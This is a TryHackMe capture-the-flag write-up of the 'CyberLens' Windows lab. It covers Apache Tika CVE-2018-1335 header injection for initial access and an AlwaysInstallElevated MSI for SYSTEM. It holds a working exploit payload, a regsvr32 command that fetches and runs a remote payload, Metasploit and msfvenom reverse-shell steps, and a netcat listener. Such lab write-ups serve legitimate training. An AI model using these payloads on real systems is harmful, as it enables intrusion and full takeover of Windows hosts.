# 🔭 CyberLens: Easy

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Windows-informational?style=for-the-badge&logo=windows)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `cyberlens.thm` |
| **OS** | Windows Server 2019 (10.0.17763) |
| **Attack Surface** | Apache Tika 1.17 CVE-2018-1335 — header injection RCE via Jetty on port 61777 |
| **Privesc** | `AlwaysInstallElevated` registry keys set → malicious MSI → SYSTEM |

CyberLens exposes an Apache Tika metadata extraction service on port 61777. CVE-2018-1335 allows injecting `X-Tika-OCR*` headers into a PUT request that are passed unsanitised to Tesseract, enabling arbitrary command execution. Initial shell lands as `CyberLens` (low-privilege user). `AlwaysInstallElevated` is enabled in both HKLM and HKCU, allowing any MSI to install as SYSTEM — a classic Windows privesc.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sC -sV -p- -vv -T4 cyberlens.thm -oA cyberlens-tcp-scan
```

```
80/tcp    open  http          Apache httpd 2.4.57 (Win64)
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  http          Microsoft HTTPAPI 2.0 (WinRM)
61777/tcp open  http          Jetty 8.y.z-SNAPSHOT  ← attack surface
```

Port 61777 is a Jetty instance serving the Apache Tika REST API. The site's JavaScript confirms it: the image metadata button sends a `PUT` to `http://cyberlens.thm:61777/meta`.

### Tika Version Fingerprint

```bash
curl -s http://cyberlens.thm:61777/ 
# Headers reveal Jetty(8.y.z-SNAPSHOT) → consistent with Tika 1.17
```

Apache Tika 1.17 is vulnerable to CVE-2018-1335.

---

## 💀 Initial Access — Apache Tika CVE-2018-1335

CVE-2018-1335 abuses Tika's OCR processing pipeline. When the `X-Tika-OCRTesseractPath` and `X-Tika-OCRLanguage` headers are set, Tika constructs a command-line invocation to Tesseract. Setting the path to `cscript` and the language to `//E:Jscript` turns the OCR call into a JScript execution engine — the request body (image content) is interpreted as JScript and executed.

### Payload

```python
headers = {
    "X-Tika-OCRTesseractPath": "\"cscript\"",
    "X-Tika-OCRLanguage": "//E:Jscript",
    "Content-type": "image/jp2"
}

jscript = '''
var oShell = WScript.CreateObject("WScript.Shell");
var oExec = oShell.Exec('cmd /c regsvr32 /s /n /u /i:http://10.14.102.34:8080/payload.sct scrobj.dll');
'''

requests.put("http://cyberlens.thm:61777/meta", headers=headers, data=jscript)
```

### Shell via MSF Web Delivery

```bash
# MSF: use exploit/multi/script/web_delivery
# Target: regsvr32
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.14.102.34
msf6 > run
```

```
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: CYBERLENS\CyberLens
```

---

## 🔁 Privilege Escalation — CyberLens → SYSTEM

### AlwaysInstallElevated

PowerUp's `Invoke-AllChecks` flagged it, and manual registry query confirmed:

```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# REG_DWORD    0x1

reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# REG_DWORD    0x1
```

Both keys set means any MSI installer runs as SYSTEM regardless of the calling user's privileges.

### Malicious MSI

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.14.102.34 LPORT=443 -f msi > rev.msi
```

```
meterpreter > upload rev.msi c://temp/
meterpreter > shell
C:\temp> rev.msi
```

```bash
nc -nlvp 443 -s 10.14.102.34
# Connection received
whoami /priv
# SeImpersonatePrivilege, SeDebugPrivilege... full SYSTEM token
```

---

## 🗺️ Attack Chain

```
[Apache Tika — port 61777]
    CVE-2018-1335: X-Tika-OCR header injection → JScript via cscript
    MSF web_delivery → Meterpreter → CyberLens user
          │
          ▼
[AlwaysInstallElevated]
    HKLM + HKCU both 0x1 → MSI runs as SYSTEM
    msfvenom MSI → upload → execute → SYSTEM shell
```

---

## 📌 Key Takeaways

- Tika's OCR integration should never be exposed to untrusted input; if Tika is used internally, restrict access to authenticated internal services only
- `AlwaysInstallElevated` is a Group Policy misconfiguration that effectively grants any local user SYSTEM-level install rights — it should never be enabled in production
- Exposing metadata extraction services on publicly reachable ports dramatically expands the attack surface; filter at the network layer if Tika is required
- Always verify both HKLM and HKCU for `AlwaysInstallElevated` — both must be set for the exploit to work, but both being set is far more common than expected
